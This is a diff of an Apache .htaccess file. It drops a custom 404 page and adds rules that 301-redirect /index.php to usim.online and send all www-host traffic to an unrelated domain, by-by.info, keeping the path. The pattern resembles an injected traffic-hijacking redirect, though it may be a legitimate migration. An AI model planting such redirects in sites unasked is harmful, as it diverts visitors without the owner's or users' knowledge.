@@ -1,7 +1,12 @@
-# Do not remove this line or mod_rewrite rules and search engine friendly URLs will stop working
+RewriteEngine On
 RewriteBase /
-
-# Return 404
-ErrorDocument 404 /404.php
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_URI} !\.(php|css|js|htc|png|gif|jpeg|jpg|ico)$
+Redirect 301 /index.php http://usim.online
+RewriteCond %{HTTP_HOST} ^www\.
+RewriteRule (.*) https://by-by.info/$1 [L,R=301]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule .* index.php [L]
 
 DirectoryIndex index.php
